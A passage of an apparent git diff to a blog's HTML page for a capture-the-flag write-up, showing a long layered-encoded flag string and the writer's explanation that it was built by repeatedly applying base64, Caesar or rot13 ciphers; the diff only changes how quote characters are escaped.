dWbFowVkc1T1ZVMVdjMVpWVm10eVZHOWFkV1pFUmxwa01WcE1WbTVhUzFZeFoxVlNiMmRYVWxWellsWlVRbFpvUms1WFUzRk9aRkl5WVU5V2IxcDZWRVphZDJkR1oxcFdiMVkwVmtkM1YxVndSalpTYjFaV1pHNXpWRll4V2xabk1WWjFWSEJ6YkZJeFNsaFhWbFp5VlRGYVYxZHVaMWhrTWxKV1ZuQXhjbEV4YzFaWGJuZHRaVWhDUjFReFozSlViMDVHVTI1M1dGWkZXbGhaYlVwU2FFWmFXVnBHVGxkU1ZYTlZWMVpTVDFVeVRsZG1SbXR1VW5CU1VGVnRSbVJXTVhOR1ZtOW5WMUl3YzBkVWIyWTFWbkJLUjFkeGMxZFNZMFpVVm5CaFpGZFdjMGRYY0dGcmFHOWFUbFl5WVdSV01rMWlVbTluVkZkSFVuSlZiMnREVjBaYWRscEZPVTlXY0ZKV1ZURlNSMWR2V2xWU2JscGFaREZaTUZaVVFXRldNVTVWVW05elYwMHhTbFZXVkVaa1ZURmFkMU51V21SU2IwcFVWbTVXWkZadloxaE5WRUp0VFZWYVlsUldWbVJYUjBWalVXOXJWVlpXV210V1JWcGtWMGRTU1ZSdmExZGtNMEpJVjFkM2JtY3haMGhTV0d0dFVtOUthMVp2V2t0U1JsWjNhRVZ6YmsxRWIwWlZNbUZUVmpGS1ZtUXpaMWhXYjBwTFZHOWFaRkl4Vm5aa1JUbFhWMFZLV0Zad01XTk5WazVYVm5GU2JsTkZOVmxWY0RFMGFGWnZkVlp4VGxkU2NGSktWVmQzZGxkd1NrZFhjWE5WVm05elRGcEdXbnBTY0U1SFZYQnJUbVZGYzFsV2NIZGtWakpGWVZOdloxVmtNbUZ6VlhBMVExWldWblZXYm5OdlVtOXpWbFZYTVVkV01rcElaMFJTVjJWWVVtdFdjREZMWjBkV1NWUnZjMDVTYm5OUlZrZGhaR1F4U25abE0zTnJVak5DV0ZwWFlXUlRNV2QxVlc1S1QxSXhXbGhWTW1GWFZYQkdkVmR3UmxwbFdGSklWRzVhYmxaV1JuZFNiMUpUWkRKNlkxWndNWHBTTVZWaVVsaHZhMUp2V2xkVVZ6VlRaRVphZGxkdlRsZGxTRUpIVlRJeE5GVXhXblptUm05WFpERnphMVpVUmxObU1YTkdWM0JyVTFKdWMxQldiVUp1WlRBMVYxWllaMnRUUlRWeVZtMUJNVmRHV2toTldHZFlaVVp6TVZWWGQzcFdiMXAyWmtaQ1YxSXpUalJaTW1Ga1YxWnpSMVJ3YTA1bFJYTlRWbTVtWVUxSFRXRlViMnRXWkRKcmRGVnZWVEZXVmxwMlZXNW5UbFp2YnpWWk1GWkxWREZhZDA5VVRsZGxXRkY2VmpKMllXWXlUa1pYYjFwT1VtOXVlbGRVUm01VU1sSllVMjVhVDFZelVsaFdjREV6VFZaYVdHaEhkMDVTYm5Nd1ZuQTFWMVV5UldKa1JsSmFWak5TVEZWalJucFhSMUpIVkc5V1UyUXpRbGxXYm1jd1pqSktSMU51V2xoa00xSlhXVzlyVTJadldYcFdWRVp0WlZWelIxbHVaekJXTURGV1prVnZWMVl6UWtSVmJVWmtVakZTZFdWSGMxTldjVUpqVjFjeE1HY3hXblprTTJ0WFpESlNWVlJXV25wVFJscElhRWhPVmsxV2MxcFdWM2R1VmpKRllWZHhjMVpOVjFKWVZtMUtSMU5YU2tkVmIyZHNWbTVXTTFadldtUldNa2w2VGxWclUyVnVjMnRWYjJ0RFZsWmFkMmhJWjA5U2NVSlhWbkExVDFaR1duVm1Sbk5ZWkRGYVRGWlVRV0ZTTVVwMFZHOWFUbFl4U2tsWGJtYzBXVlphZGxkeFJsTmxSVFZ6VlhCaGVtaEdXbFZUYlVKUFVtNDFXRmxVVG01WlZrcFpVVzlXVmsxSFVUQldNVnBYWm05YWQwOVdTbXhTY1VKSVZtMUtNR1l4V2tkVFdITldaRzlhV0ZadVZtUm1iMWw2VjI0NWJVMVZOV0paTUZwdVZqRmFkV1pGWVZkV2IzTjBWRlphVDJZeFduaFViMVpyVFRGS1ZWZFhNREZSTURWSFprWmFXbWh2V2xCV2NERXdUVEZuZFdSSFJsZGxWVmt5Vlc5cmNsWndTbGxrUm10V1pWaE9ORlZ3WVc1bWNFNUhXa1UxYTAwd1NrVldiMUpEWkRGUllsSnZaMVZsUmxwVldWaHpWMlp2V25aVmJrNVBaVWRTVmxWWE5XNWxSbHAxVGxWeldtUXhjMFJXVkVaTFYwZEdSazlXWjA1V2IzTXhWMjVTUjJkd1ZrZFZjVlpYWlVaemNsUlhOVkpvYjFwWWFFZEdWRTFFUmxoWmJtdExWMGRGWTJSSVRsZGxXR3N6Vkc5YWVsWXlSa1phUm5OWFpETkNObFpYTVhwV01WcDJWMjluV0dRemEydFZjR0Y2Wm05elZsZHZaMjVTYjBwaldUQmFVMVV3TVVkbVJXdFhaVWRSZWxkV1ZURlNNVnAwVjI5V2EwMXZTbGxXVjNOQ1RWZE9SMVpZYTFaa01EVlZWbTFDWkUxR1VuWlhiMDVXWlVaelkxWXlNWEpXTVZwMlprWkNWbWh1V2xCYVJtZExVbTluZDFKd2EwNWxjR3RNVmpKM1pGbFhSV0ZVV0d0c1VtOXpUMVZ1Vmt0bVJtOVZVMjFTVWsxV1NsZFdjR0Z1VmtaS2RtWklhMVpsV0ZGNlZuQXhSMDV2U25abFJtZFRaVWhDVVZaWE1HRlRNazUyWlROelpGSnZjMDlWTUZaTFUwWmFXR1pGWjFWTlZuTklWa2RoVjFWd1NsbFJjR3RXWlVkU1VGUnVXbVJTTVZaMldrWk9UbEpGV1hwWGJsWlhUa1phU0ZOeFZsSldSVnBZVlc1V1MxWXhjMFZTY1VwdlpWVTFSMWx1VlRGVk1VbGpaRVp6VjFaalJUQlZNakZYVWpGbmVGWnZVbXROY1d0aFZuQmhVMll4VFdGbVJscHJVbkJTY2xsdVZucFNNVzkxVm5GblZVMVdjMWhXY0hOUFZsVXhXRlZ2VWxabFdHdFlXa1puUzFORk1WZFZiMnRUVFhCUlkxWXhXbE5STVZsaFZIRlNWbVZIWVZoWlZFNURWakZTVlZGd1JtNWxSbHBqV1ZWbU5WUnZXWHBYY1c5YVZrVTFkVlp1V2xwbk1XZDFaVVphVGxZeWF6WldjSE5MVkRGbldGSnVaMVpsUmtwVVZuQmhkV2hHV2xkWGIxcFBWbTQxWTFsdVduWmtWa2xpYUVaV1YyUXhXak5XUkVaa1ptOW5lRnBHV2s1U1JWcFlWa1phVjFsV1VuWlhiMmRZWlc5S1YxUldXa3RUUm05WWFFaEtiazFXV21KWmJscDZWRzlaWWxvemExZGxSa3BEV2tSS1VtaEdUbGxhUjBaVFpEQnpVVmRXVWtkWGJqRjJWMjlXVTJWSFVsUldjSFpoVG05V2QyaEhkMnRXTUhOSVZqSTFSMVl3TVZkWGIyZGtWbFp6WkZwWE1VZFNiMXAyVlc5blRsTkZTVEJXTVdaaFRrWlJlazFXWjFoa01YTlpXVlJPVTFaR1duWmFSemxUVFZoQ1dWUnZWbTVrUmtsNlRsWnpXbFpXV210V2JVcExabTlPZGxadldsZGxWMnRaVmxkelIxbFdaMGRWY1U1clVtNDFjbFJYWVV0V2IxcDJWVzVPVmsxVk5WaFdWMkZrWkZaT1IxZHZaMXBsV0d0clZtOWFkbWRGTlZsYVJUVlhaRE5CWVZaWE1ERlZNVloyVjI5clZtUXlVbXRXYlU1eVZVWlpZbWhHVGxkTlZrcGlWakpoWkZSdlowWlRiMmRZWkRGemExcEVSa3RuUmxwMldrWldhMDB5YTFaV2NIZFhVekpXUjJWR2EyNVNNRnBWVlhCaFMxZEdXa2huU0U1WFVtNDFTVnBWVm5aV2NFWjFWMjVoV21WWWEwdGFSRVo2VW5CS1NHWkdaMnhUUlVZMFZuQmhVMVF4U1dKVmIyZFZaREpoYTFWd1lVdFhSbEpWVVhGblZFMVdXbU5YYm10dVpVWktkbVpGYTFkU1kwWjVXVlpuUzFKd1RrWlViMmRyVFZaek1sWlVSbFpPVmxwMVQxWmFUbFp2U25OWlZFWjZVa1phVlZKd09XeE5ialZpVkZaclMxWndSV05SYjFwWFpYRkNXRlJXV25wWFJUVlhXa1pyVTJRelFsaFhWRUpUVWpGYWRVMVZhMVZrYmpWWVZXOW5VMDB4Vm5SU2JqbFlWakJ6U0ZaWFlVOWtWa3AyWmtoclYxZElRbEJWWTBaV2FGWldkVlp2V214bFYydFlWMVpTUzAwd01YWldXR2RXWkdOdlZGbHVXblpOTVZsaWFFVTViRkp2YzFwVlYzWXhWbTR4U0ZWdlFsZFdWbk5RVm0xR1QyWldTblptUlRWVFpETkNURlp1V21SWlZsRmhaVVpuV0dReWEzUlVWRXBUVmtaYWQyZElXbTVOVjJGV1ZWYzFUMVF4U25WT1ZtdGFWbGRyZFZadFJtUldNV2QwVW05YVRsWnhRazFXY0hka1ZERmFkbGR4U201U2IxcFlWbTVuTTAxR1duZG5SMFpWVFZWdk5WWkhOVmRrVmtwVlZtOXJWVlp3YTBSVk1tRlRWakZhVlZadlVrNWxSbk5ZVjFkM2JtWXhXa2hUYjFwWVZrVmFXRmxYZDB0b2IzTkdWMjQ1V0ZadmMySlhibHBrWkVkRllXWkdRbGRXTTJ0VVZWUkJNVll5U2tsVGNFWk9UVzlLVjFad1lXNWxNVXAyVm0xYVUyUmpiMWhaYmxaNmFGWnZWbFp4VGxWbFJuTllWakZTUTFkSFJuVlRjVXBXVFhGT05GVXhaMGRUVms1MlZHOU9WMDB5YTFGV2NEQjZaekF4Vms1WVRsUmxSMnR5Vlc5YWVsWkdVbGRXVkVaWVZtOWFNVmt3Vms5VWIxcDNhRVpyV2sxR1dtTlpWRVprWmpKT1NHUkdXazVsYjBwWlZtNWFaRlV4U25kU2JsWlRaVVp6VDFsWE1XTm5NVnAxVjNCM1UwMVdTbU5XY0dGa1pGWktSbGR2VWxwa01YTnJXVEZhWkZJeFduWmFSbEpYVFVSV1dWWnVaekJXTVZwSFUyOVdVMlF5YTFoVmNHRjZWVEZTVjFaVVJsZGxSMUpqVm5CaFQxVXhTbGRtUld0WVZqTnJWMVJ2V21SU01WSjJWbTlLYkdReGMzcFdWMkZ1WkRBMVIxZHVaMVpsUlRWVVZGWmFaRTFXYjNWWGNXZFdUVzV6TVZWWGMxTlpWbHBYVjNGdlpGSkZXbFJWTUdkUFUxZEtTR2hHWjFkTk1tdGFWbkJ6UzAxSFRXSldibXRVWlVaeldGbFhZV1JYUm05MlpFWk9VazFXV1RKV1J6VlBWakpLUm1WalNsZFNNMUpyV1ZablMxTldSblZvUm5OWFVsWnpVVlpYTUdGV01VNVlVMjVyVGxZelFsaFpWRWswYUVaYVdFMVVVbTVOVlRWSVZrZGhibFpYU25aWGIxWlhaVlJXUkZwV1dsZG1NVnAzWjBaV1RtUXhXV05YVjNkWFpqSkdkbE5ZYzFaa1kyOVlWbTFPY2xWR1VsZFhiamxYWlZVMVJsVndZV1JXTVZwMlprVXhXRlpGV25WWFZscFBabTR4Vm1SSGMxUlNWbk5oVmxkM1ZrMVdVV0ZYY1VwWFpWVmFWMVJWVWtkV01XOVdWbkJHYkZKdmMxZFdiMnR5VjI0eFYxZHhXbFpOY1d0aldUSmhlV2h2YzBobVJtZHNWakpyVFZadlVrZFpWMFZpVlc1clZXVnVjM0pWYmxwa1ZtOVNWbHBFVWxkU2IzTklWakl3TlZVeFduVk9WVnBXWlZocldGWnVXbVJtYjJkMlZtOWFhMlF3YzNKV1ZFSmtWVEpTU0ZWdVdtNVNiMHBQVkZjMWNsZFdaMVZTY0VaVlRWVTFZMVl5TlZOVU1WcEhVMjlTVjJReFdreFZiVVpXYUZVMVdWUnZVbE5rTTBKSVYxWldVMVV5UmxkVGIxcFlaRE5TYTFWd1lYcE5NV2RYV2taS2JrMXVjMGRaYmxwVFpGZEtkVk5VUWxkbFdFSlFWVlJHVm1oR1VuWmtSbHByYUc5YVdWWndZV1JaVmxwSFYxaHZiVkpYVWxOWmJscDZVMjlWWW1aR1oxWk5WbTgyVlZkM01GWnVNVWhrU0hOWFRVZFNVRnBHWjBkVFYwWkhXa1puVjJWdVNrMVdjSGRrVlRGRllWTllhMVZrTW10clZXOW5VMlpXV25aYVJ6bFBVbTl6TUZwRlZqQldSMHBIWlVSYVYyVllVak5XYm1kTFpqRm5WVkZ2YzA1bGIwb3lWMjlXWkZOd1VXRldiMjlrVWpOcldGWndOVU5UYjFwVlVtOWFiMUl4U2xoV1IyRnVWakpLUmxOdU9WWmxSbk5rVkZaYVZtaEdXbmRuUmxKWFpHTkZNbFp3TUdGTlIwWllVMjVuVkdSamIxaFVWVnBrWjFaelYxcEZXbTVOYjFwSFYyNWFUMVJ2V2xWUmJWWllWa1ZhVkZWVVJsTm1Na3BKVTI5YWEwMHhTbEZXY0RGalRWWlJZVlZ2YTA5V2NGSlZWWEIzZGs1R1dsaE5XR2RXWkdOR1JsVndZVk5YYmpGWFpraEtaRlp3VWxoV01GcFRaakZhZGxWdlRsZE5NbXRrVm01YWJrMUdXV0ZVV0c5VlpVZHJWVmx3TVhKV01XOTJWbFJHV0ZKdldtRlZWelZQVmtkS1IyWkdhMXBOUm5OVVZsZGhXbWh3UmtaYVIwWlhaVVp6TmxaSGQyNVRjRlozVW01YWJGSXlhM0phVjNka1ZqRmFTR2hIYzA1V2IwcGlWRlpXY21ReFRrZFRiMUpYVFVkU2VGUldXbnBXYjFwNFdrWm5WMlZHV1RCV2JVb3daakZTZDFKdFdsTmxSbk5YV1c5clExUkdWblpXV0d0WFpWWmFSMWx1WjBkVWIwcDRVVlJDVjFkSVFsQlpZMFp1VTBaU2VGVnZUbXhsVjJ0WlZsZGhiazVHV1dGWGJsWlVaVzQxVkZsdVZURlRWbWQxV1ROclYxSnVjMGRaTUZwWFZqSktXVlZ3YTFaTmNXdFVWbTFLVDFOR1NuWmFSbEpUWlVoQ1UxWnZaelJsTWsxaFUzRlNVMlZ1YzFsV01HZFRabFphZDJoSFJsUldjR0ZqVm5CaGJtUXhXblZtU0d0V1pWUkdTRlpIWVV0WFYwWkdaa1pyYTJRelFrMVdWRW8wVmpKU1YxZHhVbXRTTW1GelZXOWFlbFZHV2toblJscHVUVzlhV0ZVeVlYWmtiMDVJYUVaclZrMUdXbXRWVkVaWFowZFdSMVJ2WjFObFZrcFlWa1phWkZVeFZXRlhjVTVVWkc1YWExWndZV1JUUmxsaWFFVjNWMlZWV2tsWk1GcFBWRzlLZFdaRk1WZGxSa3BJV1dOR1QxWXlTa2RYYjJkc1VtOXpWVlp3ZDFkWlZUVkhWbGhuVjJWSFVsQldjSFl4VjFaVlltZEhPVmRTYm5OWldsVm1OVmR1TVhSV2NWcGFaVmhyYTFadFNrOVNNVloyVTI5bmJGSlhPR0ZXTW1GWFpUSk5ZVnBGWjFWbFIyRnpWVzFPUTFaR1VsVlJjVnBPVW5CU1lWVndNRFZXVjBZMlVXMU9WVTFYYTFSWlZ6RkxVbkJKWTJSR1oydGtNSEpqVm05U1IxVXhXV0ZhU0VwVlpVWktUMVp2VWxab1JscFZVbkJHVkUxV2MwaFdSMkZrVmpKR2RsTnhSbGRsUmxWaFZWUkdWbWN5UmtoUFYzTlhaVVZ6UjFadVp6QlRNa1pZVWxoclYyUnVOVlpVVmxwa2FHOVdkMDFXWjI1V2JuTmpWbGN4ZGxSdU1YZGtSa0pYWlZoQ1JGa3lNVmRXTVZaMlpVWm5hMDF4YTJ0V2NHRmtXVlpTZGxaeFNsZGxWRzlRVm5CaFIwNXZWbGRrUnpsWVpHTkdZbFl5YzBkV01WbzJVbGhuVjJReVVreFpZMFpQWm5CT1JrNVdUbGRsYmtwTFZuQjNVMUV5UldGVWNVcE9WbGRyZEZVd1ZtUm1WbTkzVFZjNVYxWnZjMkpXY0RWUFZrVXhkbE52YTFwTlJscHJWa2RoU21oV1ZuaFZiMXBYWlVaek1sZFdaelJUTWxKR1QxWm5WR1ZHV2xoWldITlhVMVpuZGxad1JsVk5Wa3BJVlRKaGRsbFdTblZUY0VaYVZrVnlNRlp1V2xab1JtZDNVbTlXYkZKdmNucFdNbmRrWmpGYVIxUnVhMVpsUmxwWFZGYzFVMDB4VW5WYVJtZFlWakJhU2xsVldsTldSa3AyWmtoclYxWXpVbGhaWTBaUFpqRmFXV1ZGT1ZkWFJVcFVWbkExZWxZd05VZFZiMnRQVmxaelQxbHVWVEZvYjFWaVRsYzVWMDFFUmtsV1YzWmhWMjR4VjJaSGEyUlNjRkpZVlhCaFpGZFdjMGRVYjJkWVVsVnpORlp0Um01TlIwbGlVbTVyVldReWEzUlZNRnBrVmpGdldXWkZTbTlTYjFvd1ZHOXJUMVZ3U2taT1dHOWFUVVpLV0ZaWFlXUldWMHBGVkc5YVRsSnZXVEJXVkVvMFZURlpZVlp2VmxOa1kyOVVWbkExUTFaV1drZFhiMmRQVW01elkxWndOVmRXTWtwMVYyOVNWbVZIVVRCWk1WcFdhRVphV1dSR1oxZFdSMkZYVm05blkwMVdVblZOV0VwUFZqQmFWMWx2YTFObWIxcEZVMjVhYmsxWFVtSmFWV2MwVmpKS1YxTlVSbGROVm5OWVZuQjJZVkl4VG5oVWIwNXJUVmhDVUZaWFlXUlpWazVYVjI5V1UyVllVbFZXY0RFMFYyOWFkMmhIZDFaTmJsWTFXbFZXTUZZeVJXRlhiMmRrVWtWYVVGWndNVWRTYjJkM2FFWm5iRlp1Y3pOV2IyWjZUVmRKWVZSeFRtUlNjR3RSVm5CaGVsWkdXblZYY1dkVVVtOXpXVlJXVWtOa01VcDFaa1p6V2xaWFRXRldNakZMWm05T2RXWkdaMU5sVmtwSlZsZHpSMWxXV25aWGNVNVhaVVpLV0ZZd1ZrdFNNVnBIVjI5blYyVldXa2hXTVd0eVYwZEtkMlJHVmxabFJrcElWakJhVm1jeFZuVlBWMkZUWlVoQ1NWZFhjMDlrTWtwSFYzRlNiMUpYVWxkWlYzZEdUVlpTZFZkdVoxZGxWWE5KV1c1bmNtUldUa1pUYmpGWFZqTnJWRlp0Umtwbk1ERlpWWEJ6VGsxdlNsVlhWM2RYWjNCUllWVnhUbGRsV0VKMldXOWFaRmRHWjNWV2NXZFZaVlZhWTFZeGEzSldjRXBaVVc1clYwMUdWalJaTW1Ga1pqRlNkMmhHWjFkU00ydElWbTlTUTFZd05VaFZibWRWWkRGYVUxbFVRbnBWUmxwMlYzRmFiMlZHYzFaVlYzWTFWVEpLUm1WRVRsVmxSMnRNVm01YWJsTldSblpXYjJkT1VtOXpNVmR2Vm1SWGNGWkhWbkZLWkZKdmMzTlpiMnR5VjFaYVdFMUVSbTVOYjFwSlZsWnJlbFZ2WjBsUmNVcFhaVVp6TTFVd1dtUm1NVnA0Vkc5blUyUXpRbGRXVm1jMFZUSkdSazFWYjFKV1JWcFlXVmQzZWxSR1ZsaE5WbWRVVW05S01GbFZaM3BWTWtWalVXMUdWMlZZUWtoYVJFWk9hRlpLV1dSR1dtdE5NVXBqVmxSQ1pGWXdNR0ZXV0d0WVpVVTFXRlZ3ZGpGWFZsSjJWM0JHYTJWR2MwaFdNbmQ2V1ZaWlkxVnZhMVZsV0d0VVZYQXhUMUpXVm5WT1ZtZFhUVEpPTkZadFJsTlNNa1ZpVm05clYyUXlVbFpaYm1keVZsWlZlbVJGU205U2NVSlhWbkJoYmxaRk1WaG5SRlpYVFhGU1kxWkhkbUZtYmpWWFpFWmFhMlF3YzJKV1Z6RmpUVmRPZDFOdVoxaGxSVFZZVkZSS2NsTkdaM1pXY0RsWFRWVTFTRlV5ZDFkVmNFVmpVWEZPV2xaRmNucFVibHAxYUVabmQyZEdjMWRXUlZwWlYxUkNjbFV4VldGWGJWcFRaVVZhVjFsWGQwdE5NVnBWVW05T1ZGSXdOVXBXY0dGa1ZqRmFkbVpHV2xka2JuSXdWbTFHVjFJeFRsbGFSbXRzVWxoQ1dGWkdaelJuTVUxaFprWm5aRkpVYjFWV2JVRXhVMFphU0dkRmQydFdNRmt5VlZkelYxbFdTblptUld0V1pWaHJVRlp0Um5wU1ZsWjJVMjluVjAxd2FqRldjREJoVFVkRllWUnZaMVZsUjFKWVdXOVdaRlpXVWxobU0ydFBaVVpXTlZSdmEwOVhSa3AzYUVSQ1ZVMVdTbFJXYmxwa1pqSk9SVlp3UmxkV01tdEpWbTFDYmxNeVVsZG1SRnBXWkdOV1ZGWndZWFZuTVZsaVRsaG5XbFp1TldOV1IzZGtWRzlaWTFGeFJscGxWRVo1Vkc1YVpHWXhXblpYY0dGVFpERnpXRlp1WnpCa01WVjZUVlZXYkZKVk5WZFVWelZ5VjBaU2RsZHZjMjlsUlRVd1dWVmFUMVl5U2tsUmNEbFlaVVp6ZVZWdFNrcG9WbEo0Vkc5YWJHVlhhMk5XVnpWNlZtNHhSMVp4VGxobFdGSjFXVzVhWkZZeGIzVlhiamxXVFc1elYxWXlOVWRXTVVwWFYxUkNWazF4YTB4V2NERlRVMVpuZDJoR1VsTldjVUpKVm05bU1XY3hVV0ZTY1VwT1UwZHJkRlZ3WVhwWlZsSldaRWM1VlZKeFFsZFpWV3RQVjBaS2RXWkZaMXBXVmxWaFZtNWFUMUp2VG5aWGIxWnNVbkZDVVZaWGMwSm9SMUpJVlc1YWExSXpRbk5aYjJkdVRrWmFWMWR2WjFOTlZuTllWbTlyY2xkSFJXSmtSbFpWVm05VllWWndZV1JTTVc1alpFWm5VMlZXU2t0V1ZFb3daekZhZFUxVmExWmtNbUZXVm05YVpGZEdXV0pvUlRsVFZtNWFNVmxWV21Sa1JURlpVVzlTV0dWR2MxUldSRVpMWjBaV1dWcEdUbXROY0d0VlYxWm5NRk14VFdGYVJtZFhWMGRyV0Zad01UQk9SbGxpVFZWblYxSXdjMWxXUjNOUFZuQktSMlpGWVZWbFJuTXpXVEl4UzFJeFduWlhialZUVFRKclVWWnVXbE5SY0ZaSFYzRk9WV1F4YzNKVmNHRkxWa1pTVm1SSE9WVlNjVUpYVmxkM2JsWkhSalpTYm1kYVpERnphMVpVUmt0WFIxWkZWVzluYTJRd2N6RlhibEpIVm5CV1YxZHhTbGhsUmtwVVZGZGhTMmN4V2xWUmNIZFRUVzlHTlZWd05VdFhSMHBIWmtaT1YyUXhjMnRWTUZwWFRtOU9kVTlXVW14U1dFSmtWMVpXYlUxV1dXSlRjVXBUWkc0MVYxUldaMU5UUm5ORlVuQkdWMlZGYzFwWk1GcFhWakZLVmxkWWMxZFNjRkY2Vm0xR1QyWXhXbGxrUjBaVVVqRktWbFp3YzBKTlZrNUhWMjVuV0dWRmMzWlZiMUpYVWpGU1ZtUklUbFpsUm5OSFZUSjNORmxXV25abVIydGFUWEZyVEZZeFowdFRSMDVIV2tVMVUxSldjMWRXYjJjMFdWWlJZV1ZHWjFWWFIyRldXVzlyVTFaR1duWmtSVXB2VW05Wk1sVlhOVXRrTURGMlYyOXJWMDF0Vm1OV2JsVmhVbTluZFZSdlowNWxiMFl6VjFabk5GVndVV0ZYY1VaWVpVaENUMWxVVGtOVGIxcFpaa1U1YlUxV2J6UldWMkZ1VlRKS1IxTnZaMXBXUlZvelZtNWFVMVp2Vm5WVWIxSlRaVVp6V1ZadVdsTlRNa1oyVTI5cmExSlViMWhaYjJ0VFpFWlZZVmR2VGxkTlZuTmlWMjVhYmxZeFdraGFNM05YVmpOQ1JGbGpSbTVTTWs1SlZIQnZUazF2U21GV1YzTlBVVEF3WVZkdlZsSmtNbEoxVm5CMk1WWXhibnBWYm1kc1VtNXpXRll5ZDNaV01VcEdaa2RyVmsxR1ZqUlZNV2RMVTBkS1NHVkZOVmRXUmxWNlZuQnpRMlJ1TVZkVVdHOVRWMGRTV1ZsWWMwZFdWbHAyV2tSU2JWSnZWalZhUldZMVZrZEtSMlZFVGxwa01tdFVWbTVhWkdadU5WWmtSbWRzVWpGS1RWZHVWbVJWTVVwM1UyNW5WV1ZYYTNKVVZWSlhVakZhVmxkdlNtNU5WVXBUVlVaUmVsQlJQVDA9&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;p&gt;What this script did was loop through a certain unknown amount of iterations and randomly chose a cipher to apply whether it was base64, caesar or rot13.&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;n&quot;&gt;enc_ciphers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;rot13&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;b64e&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;caesar&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;n&quot;&gt;enc_ciphers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'rot13'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'b64e'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'caesar'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FLAG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cnt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;#encode...&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cnt&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;xrange&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cnt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
@@ -1335,23 +1337,23 @@ After dissecting what this is, it is clearly python code in which some “flag�
 
 &lt;p&gt;After it was applied, it appended the index+1 of the cipher in enc_ciphers to signify which cipher was done&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;n&quot;&gt;enc_ciphers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;rot13&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;b64e&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;caesar&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;n&quot;&gt;enc_ciphers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'rot13'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'b64e'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'caesar'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;enc_ciphers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;#...&lt;/span&gt;
